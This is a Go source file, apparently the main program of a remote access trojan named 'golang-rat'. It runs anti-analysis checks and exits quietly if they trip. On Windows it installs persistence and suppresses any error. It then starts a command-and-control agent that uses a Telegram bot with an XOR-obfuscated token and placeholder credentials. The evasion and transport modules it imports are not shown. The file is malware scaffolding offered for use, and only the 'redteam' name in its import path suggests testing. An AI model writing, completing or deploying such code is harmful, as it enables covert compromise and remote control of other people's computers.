package main

import (
	"log"
	"os"
	"runtime"

	"github.com/redteam/golang-rat/internal/evasion"
	"github.com/redteam/golang-rat/internal/transport"
)

// Placeholder for XOR-encrypted bot token and key
// Use the xor_tool to generate these
var (
	encryptedToken = []byte{0x00} // Replace with real encrypted bytes
	xorKey         = []byte("your-secret-key")
	adminChatID    = int64(123456789) // Replace with your real Telegram Chat ID
)

func main() {
	// Anti-Analysis check
	if evasion.CheckAll() {
		os.Exit(0)
	}

	// Persistence for Windows
	if runtime.GOOS == "windows" {
		err := evasion.InstallPersistence()
		if err != nil {
			// Silently fail or log to a hidden file
			// log.Println("Persistence failed:", err)
		}
	}

	// Initialize and start the C2 agent
	agent, err := transport.NewAgent(encryptedToken, xorKey, adminChatID)
	if err != nil {
		log.Fatal(err)
	}

	agent.Start()
}
